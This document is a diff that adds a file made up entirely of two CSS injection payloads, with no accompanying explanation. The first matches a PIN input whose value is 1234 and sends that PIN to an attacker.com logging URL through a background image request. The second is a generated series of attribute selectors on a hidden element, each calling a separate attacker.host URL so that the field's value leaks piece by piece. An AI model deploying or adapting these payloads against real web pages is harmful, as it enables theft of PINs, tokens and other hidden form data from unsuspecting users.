@@ -1,0 +1,15 @@
+<style>
+   input[name="pin"][value="1234"] {
+      background: url(https://attacker.com/log?pin=1234);
+   }
+</style>
+
+
+
+
+<style>
+        #hidden_ele[value*="aa"]~#aa{background:url("https://attacker.host/aa");}#hidden_ele[value*="ab"]~#ab{background:url("https://attacker.host/ab");}#hidden_ele[value*="ac"]~#ac{background:url("https://attacker.host/ac");}#hidden_ele[value^="a"]~#a_{background:url("https://attacker.host/a_");}#hidden_ele[value$="a"]~#_a{background:url("https://attacker.host/_a");}#hidden_ele[value*="ba"]~#ba{background:url("https://attacker.host/ba");}#hidden_ele[value*="bb"]~#bb{background:url("https://attacker.host/bb");}#hidden_ele[value*="bc"]~#bc{background:url("https://attacker.host/bc");}#hidden_ele[value^="b"]~#b_{background:url("https://attacker.host/b_");}#hidden_ele[value$="b"]~#_b{background:url("https://attacker.host/_b");}#hidden_ele[value*="ca"]~#ca{background:url("https://attacker.host/ca");}#hidden_ele[value*="cb"]~#cb{background:url("https://attacker.host/cb");}#hidden_ele[value*="cc"]~#cc{background:url("https://attacker.host/cc");}#hidden_ele[value^="c"]~#c_{background:url("https://attacker.host/c_");}#hidden_ele[value$="c"]~#_c{background:url("https://attacker.host/_c");}
+    </style>
+	
+	
+	
